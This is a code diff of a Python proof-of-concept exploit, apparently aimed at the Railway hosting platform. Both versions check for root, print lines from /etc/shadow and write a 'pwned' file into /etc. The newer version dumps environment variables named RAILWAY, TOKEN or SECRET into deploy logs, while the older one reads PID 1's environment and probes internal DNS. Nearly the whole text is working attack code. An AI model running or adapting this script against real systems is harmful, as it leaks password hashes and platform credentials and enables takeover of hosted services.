@@ -1,64 +1,54 @@
 import os
 import sys
-import subprocess
 
-def bold_log(msg):
-    sys.stderr.write(f"\n{'='*60}\n[!] {msg}\n{'='*60}\n")
-
-def run_proof():
-     
-    uid = os.getuid()
-    gid = os.getgid()
-    bold_log(f"IDENTITY: UID={uid} GID={gid} (FULL ROOT ACCESS)")
-
-     
-    bold_log("SENSITIVE FILE ACCESS: /etc/shadow")
-    try:
-        with open("/etc/shadow", "r") as f:
-            # Читаем только первые 3 строки для пруфа
-            lines = f.readlines()
-            for line in lines[:3]:
-                sys.stderr.write(line)
-    except Exception as e:
-        sys.stderr.write(f"Access Denied or Error: {e}\n")
+def run_exploit():
+    sys.stderr.write("\n" + "="*60 + "\n")
+    sys.stderr.write("RAILWAY PRIVILEGE ESCALATION POC\n")
+    sys.stderr.write("="*60 + "\n")
 
     
-    bold_log("WRITE ACCESS TEST: /etc/pwned.txt")
-    try:
-        test_path = "/etc/pwned.txt"
-        with open(test_path, "w") as f:
-            f.write("Pwned by Lumos - Root access confirmed")
-        if os.path.exists(test_path):
-            sys.stderr.write(f"SUCCESS: Created {test_path}. Full system takeover possible.\n")
-    except Exception as e:
-        sys.stderr.write(f"Write failed: {e}\n")
+    uid = os.getuid()
+    sys.stderr.write(f"[!] IDENTITY CHECK: UID={uid} (Full Root)\n")
 
      
-    bold_log("INFRASTRUCTURE LEAK: PID 1 ENV")
+    sys.stderr.write("\n[!] READING PROTECTED SYSTEM FILE (/etc/shadow):\n")
     try:
-        with open("/proc/1/environ", "rb") as f:
-            env_data = f.read().replace(b'\0', b'\n').decode(errors='ignore')
+        with open("/etc/shadow", "r") as f:
              
-            for line in env_data.split('\n'):
-                if "RAILWAY" in line or "PROJECT" in line:
-                    sys.stderr.write(f"{line}\n")
+            for i, line in enumerate(f):
+                if i < 5:
+                    sys.stderr.write(line)
+                else:
+                    break
     except Exception as e:
-        sys.stderr.write(f"Proc access failed: {e}\n")
+        sys.stderr.write(f"FAILED TO READ /etc/shadow: {e}\n")
 
-     
-    bold_log("NETWORK RECONNAISSANCE")
+    
+    sys.stderr.write("\n[!] TESTING SYSTEM WRITE ACCESS (/etc/):\n")
     try:
-        domain = os.getenv("RAILWAY_PRIVATE_DOMAIN", "Not Found")
-        sys.stderr.write(f"Internal Domain: {domain}\n")
+        target_file = "/etc/railway_pwned.txt"
+        with open(target_file, "w") as f:
+            f.write("POC by Lumos: Root write access confirmed.\n")
         
-        sys.stderr.write("Testing internal DNS resolution...\n")
-        os.system(f"getent hosts {domain}")
-    except: pass
+        if os.path.exists(target_file):
+            sys.stderr.write(f"SUCCESS: Created {target_file}\n")
+            sys.stderr.write("This proves an attacker can modify system binaries/configs.\n")
+    except Exception as e:
+        sys.stderr.write(f"FAILED TO WRITE TO /etc/: {e}\n")
 
-    bold_log("POC FINISHED. BLOCKING DEPLOY TO SHOW LOGS.")
+    
+    sys.stderr.write("\n[!] DUMPING INFRASTRUCTURE SECRETS:\n")
+    for key, value in os.environ.items():
+        if "RAILWAY" in key or "TOKEN" in key or "SECRET" in key:
+            sys.stderr.write(f"{key}={value}\n")
+
+    sys.stderr.write("\n" + "="*60 + "\n")
+    sys.stderr.write("POC FINISHED. EXITING TO SHOW LOGS.\n")
+    sys.stderr.write("="*60 + "\n")
     sys.stderr.flush()
-     
+
+    
     sys.exit(1)
 
 if __name__ == "__main__":
-    run_proof()
+    run_exploit()
